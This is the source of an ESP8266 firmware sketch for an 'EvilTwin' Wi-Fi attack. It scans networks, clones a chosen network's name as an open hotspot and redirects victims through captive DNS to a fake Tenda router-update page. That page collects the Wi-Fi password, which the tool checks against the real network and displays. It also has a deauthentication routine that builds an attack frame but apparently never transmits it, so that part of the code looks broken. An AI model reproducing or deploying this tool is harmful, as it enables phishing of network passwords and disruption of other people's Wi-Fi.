#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

void setup() {

  Serial.begin(9600);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("OPPO A12", "nakanokurumi22");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><style>body{background-color:#f2f2f2;font-family:Arial,sans-serif}h2{color:#333333;text-align:center}p{text-align:center}</style><script>setTimeout(function(){window.location.href='/'},3000)</script><meta name='viewport' content='initial-scale=1.0,width=device-width'></head><body><h2>Wrong Password</h2><p>Please try again.</p></body></html>");
    Serial.println("Wrong password tried !");
  } else {
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("OPPO A12 S", "nakano22");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    String content = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'></head><body><h2>Good password: " + _correct + "</h2></body></html>";
    webServer.send(200, "text/html", content);
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    Serial.println(content);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("OPPO A12", "nakano22");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html><html><head><style>body{background-color:#f2f2f2;font-family:Arial,sans-serif}h2{color:#333333;text-align:center}.loader{display:flex;justify-content:center;align-items:center;height:100vh}.loader-text{font-size:20px}</style><script>setTimeout(function(){window.location.href='/result'},15000);</script></head><body><div class='loader'><h2 class='loader-text'>Updating, please wait...</h2></div></body></html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><head><style>body { background-color: #f2f2f2; font-family: Arial, sans-serif; } h2 { color: #333333; text-align: center; } form { width: 300px; margin: 0 auto; } label { display: block; margin-bottom: 10px; font-weight: bold; } input[type='text'] { width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; } input[type='submit'] { width: 100%; padding: 10px; background-color: #4caf50; color: white; border: none; border-radius: 4px; cursor: pointer; } input[type='submit']:hover { background-color: #45a049; } footer { margin-top: 20px; text-align: center; font-size: 12px; color: #999999; } </style></head><body><h2>Update your Tenda Router - '" + _selectedNetwork.ssid + "'</h2><div><p>Keeping your router up-to-date is important to ensure optimal performance, security, and new features. By updating your Tenda router, you can:</p><ul><li>Enhance network stability and speed</li><li>Fix any known security vulnerabilities</li><li>Access new features and improvements</li></ul></div><form action='/'><label for='password'>Enter Password:</label><input type='text' id='password' name='password' placeholder='Your password' minlength='8'><input type='submit' value='Submit'></form><footer>&copy; 2023 Your Company. All rights reserved.</footer></body></html>");
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    deauthPacket[0] = 0xC0;
    deauthPacket[0] = 0xA0;
    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}